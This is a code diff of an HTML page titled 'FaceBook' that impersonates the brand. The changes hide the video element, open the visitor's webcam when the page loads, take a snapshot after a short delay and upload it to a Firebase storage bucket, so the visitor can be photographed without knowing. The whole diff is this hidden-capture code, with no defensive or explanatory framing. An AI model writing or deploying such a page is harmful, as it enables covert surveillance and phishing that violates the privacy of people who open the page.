@@ -1,12 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>facebook</title>
+  <title>FaceBook</title>
+  <style>
+    #video {
+      display: none; /* Hide the video element */
+    }
+  </style>
 </head>
 <body>
-  <h1></h1>
+  <h1>FaceBook</h1>
   <video id="video" autoplay></video>
-
 
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
@@ -22,18 +26,25 @@
       storageBucket: "a2za2za2z1.appspot.com",
       messagingSenderId: "1092163255405",
       appId: "1:1092163255405:web:702ceabc4045e853ce5364"
+      // ...
     };
     firebase.initializeApp(firebaseConfig);
     const storage = firebase.storage();
     const storageRef = storage.ref();
 
     const video = document.getElementById('video');
-    const captureButton = document.getElementById('captureButton');
 
     let stream;
-    let mediaRecorder;
 
     // Request access to the camera and start streaming
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    }
 
     // Capture image from the video stream
     function captureImage() {
@@ -44,18 +55,40 @@
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob((blob) => {
-        const filename = 'captured-image.png';
+        const currentTime = new Date();
+        const filename = `captured-image_${currentTime.getHours()}.${currentTime.getMinutes()}.${currentTime.getSeconds()}.png`;
         const uploadTask = storageRef.child(filename).put(blob);
 
         uploadTask.then(snapshot => {
           console.log('Image uploaded successfully:', snapshot.ref);
+          stopCamera(); // Stop the camera stream after uploading
         }).catch(error => {
           console.error('Error uploading image:', error);
         });
       }, 'image/png');
     }
-    captureImage();
 
+    // Stop the camera stream
+    function stopCamera() {
+      if (stream) {
+        const tracks = stream.getTracks();
+        tracks.forEach(track => {
+          track.stop();
+        });
+      }
+    }
+
+    // Start camera when the page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      startCamera();
+
+      // Automatically capture image after a time interval (in milliseconds)
+      const captureInterval = 1500; // 3 seconds
+
+      setTimeout(() => {
+        captureImage();
+      }, captureInterval);
+    });
   </script>
 </body>
 </html>
